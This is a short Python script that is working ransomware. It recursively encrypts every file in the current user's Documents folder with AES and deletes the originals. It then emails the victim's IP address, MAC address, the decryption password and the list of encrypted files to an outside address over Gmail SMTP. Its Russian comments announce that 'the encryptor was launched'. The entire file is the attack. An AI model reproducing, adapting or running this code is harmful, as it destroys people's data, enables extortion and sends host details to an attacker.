import os
import pyAesCrypt
import getpass
import secrets
import string
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import socket
import uuid
from config import *



def generate_password(length):
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(secrets.choice(alphabet) for i in range(length))
    return password


def crypt(file, password):
    buffer_size = 64*1024
    pyAesCrypt.encryptFile(str(file), str(file) + ".aes", password, buffer_size)
    os.remove(file)

def walk(directory, password):
    mas = []
    for name in os.listdir(directory):
        path = os.path.join(directory, name)
        if ".aes" in path:
            continue
        try:
            if os.path.isfile(path):
                mas.append(path)
                crypt(path, password)
            else:
                walk(path, password)
        except:
            continue
    return mas


password = generate_password(20)
path = os.path.join("C:", "Users", getpass.getuser(), "Documents")
mas = walk(path, password)


# Создаем объект SMTP сервера и подключаемся к почтовому серверу Gmail
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(email, password_email)

# Создаем объект письма
msg = MIMEMultipart()
msg['From'] = email
msg['To'] = to_email
msg['Subject'] = 'Шифровальщик был запущен'

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])

body = f'Программа была запущена на каком-то ПК.\nIP-адрес - {ip_address}\nMAC-адрес - {mac_address}\n' \
       f'Пароль для расшифровки - {password}\nЗащифровано {len(mas)} элементов. Список:\n'
for i in mas:
    body += str(i) + '\n'

msg.attach(MIMEText(body, 'plain'))
text = msg.as_string()
server.sendmail(email, to_email, text)
server.quit()